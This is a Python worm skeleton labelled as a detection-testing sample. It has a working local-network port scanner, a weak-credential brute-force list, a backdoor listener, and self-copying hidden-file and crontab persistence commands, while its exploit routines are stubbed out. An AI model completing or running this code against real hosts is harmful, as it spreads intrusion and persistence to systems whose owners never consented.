#!/usr/bin/env python3
"""
Network Worm Simulation - TEST ONLY
DO NOT EXECUTE - For security detection testing
"""

import os
import sys
import socket
import threading
import subprocess
import random
import time
import base64
from ipaddress import IPv4Network

# Worm configuration
SCAN_PORTS = [22, 445, 3389, 5900, 8080]
THREAD_COUNT = 100
PAYLOAD_PORT = 9999

# Common weak credentials
CREDENTIALS = [
    ("root", "root"),
    ("admin", "admin"),
    ("admin", "password"),
    ("root", "toor"),
    ("user", "user"),
    ("admin", "123456"),
    ("root", ""),
    ("administrator", "administrator"),
]

class NetworkWorm:
    def __init__(self):
        self.infected_hosts = set()
        self.scan_queue = []
        self.running = True
        
    def _get_local_network(self):
        """Determine local network range"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            
            # Assume /24 network
            network = '.'.join(local_ip.split('.')[:-1]) + '.0/24'
            return IPv4Network(network)
        except:
            return IPv4Network("192.168.1.0/24")
    
    def _scan_port(self, ip, port, timeout=1):
        """Check if port is open"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((str(ip), port))
            sock.close()
            return result == 0
        except:
            return False
    
    def _scan_network(self):
        """Scan local network for vulnerable hosts"""
        network = self._get_local_network()
        
        for ip in network.hosts():
            if not self.running:
                break
                
            ip_str = str(ip)
            if ip_str in self.infected_hosts:
                continue
                
            for port in SCAN_PORTS:
                if self._scan_port(ip_str, port):
                    self.scan_queue.append((ip_str, port))
    
    def _exploit_ssh(self, ip, port=22):
        """Attempt SSH brute force"""
        for user, passwd in CREDENTIALS:
            try:
                # Would use paramiko to attempt SSH login
                # ssh = paramiko.SSHClient()
                # ssh.connect(ip, port, user, passwd, timeout=5)
                # self._deploy_payload(ssh)
                # return True
                pass
            except:
                continue
        return False
    
    def _exploit_smb(self, ip, port=445):
        """Attempt SMB exploitation (EternalBlue-style)"""
        # Would attempt MS17-010 or similar SMB exploits
        # This is simulation only
        pass
    
    def _exploit_rdp(self, ip, port=3389):
        """Attempt RDP brute force"""
        # Would attempt RDP authentication
        pass
    
    def _deploy_payload(self, connection):
        """Deploy worm payload to infected host"""
        payload = base64.b64encode(open(__file__, 'rb').read()).decode()
        
        commands = [
            f"echo '{payload}' | base64 -d > /tmp/.worm.py",
            "chmod +x /tmp/.worm.py",
            "nohup python3 /tmp/.worm.py &>/dev/null &",
            # Persistence
            "echo '@reboot python3 /tmp/.worm.py' | crontab -",
        ]
        
        # Would execute commands on remote host
    
    def _propagate(self):
        """Main propagation loop"""
        while self.running:
            if not self.scan_queue:
                self._scan_network()
                time.sleep(60)
                continue
            
            target = self.scan_queue.pop(0)
            ip, port = target
            
            success = False
            if port == 22:
                success = self._exploit_ssh(ip, port)
            elif port == 445:
                success = self._exploit_smb(ip, port)
            elif port == 3389:
                success = self._exploit_rdp(ip, port)
            
            if success:
                self.infected_hosts.add(ip)
                print(f"[+] Infected: {ip}")
    
    def _start_backdoor(self):
        """Start local backdoor listener"""
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server.bind(('0.0.0.0', PAYLOAD_PORT))
            server.listen(5)
            
            while self.running:
                client, addr = server.accept()
                # Handle incoming connections
                client.close()
        except:
            pass
    
    def start(self):
        """Start worm operations"""
        threads = [
            threading.Thread(target=self._propagate, daemon=True),
            threading.Thread(target=self._start_backdoor, daemon=True),
        ]
        
        for t in threads:
            t.start()
        
        while self.running:
            time.sleep(1)

if __name__ == "__main__":
    print("[!] NETWORK WORM SIMULATION - TEST FILE ONLY")
    print("[!] This file is for security testing purposes")
    # worm = NetworkWorm()
    # worm.start()
